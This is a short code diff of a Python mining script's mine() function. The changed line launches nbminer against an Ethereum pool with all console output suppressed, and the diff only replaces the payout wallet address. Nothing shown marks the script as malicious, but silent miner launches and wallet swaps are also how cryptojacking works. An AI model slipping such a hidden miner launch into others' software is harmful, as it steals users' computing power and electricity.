@@ -351,7 +351,7 @@ def mine(worker):
                 subprocess.Popen(f'{dir_path}{f.read()}{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                 print("from file")
             except:
-                subprocess.Popen(f'{dir_path}rvncoinminer\\nbminer.exe -cmd-output 0 -a ethash -o ethproxy+tcp://eu1.ethermine.org:4444 -u 3b884e6d3cc3517269ffe1b86fcdf034f9e42b15.{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
+                subprocess.Popen(f'{dir_path}rvncoinminer\\nbminer.exe -cmd-output 0 -a ethash -o ethproxy+tcp://eu1.ethermine.org:4444 -u 0x6584ff59218B1619D5dd39410295Eb2025a8Dbd5.{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                 print("normal")
             mining = True
         if len(mine_on_4g) != 0:
